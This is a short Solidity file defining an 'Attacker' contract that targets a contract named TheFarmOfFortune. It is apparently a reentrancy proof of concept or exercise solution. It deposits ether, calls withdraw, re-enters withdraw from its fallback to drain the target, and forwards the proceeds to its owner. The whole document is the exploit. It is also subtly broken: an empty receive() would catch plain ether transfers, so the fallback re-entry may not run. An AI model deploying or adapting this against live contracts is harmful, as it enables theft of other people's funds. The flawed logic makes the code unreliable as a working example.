//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheFarmofFortune.sol";

contract Attacker {
    TheFarmOfFortune target;
    address owner;

    receive() external payable {
    
    } 
    
    constructor(address _target) {
        target = TheFarmOfFortune(_target);
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this");
        _;
    }

    function attack() public payable {
        target.sendTokens{value: msg.value}();
        target.withdraw();
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    fallback() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw();
        }
    }
}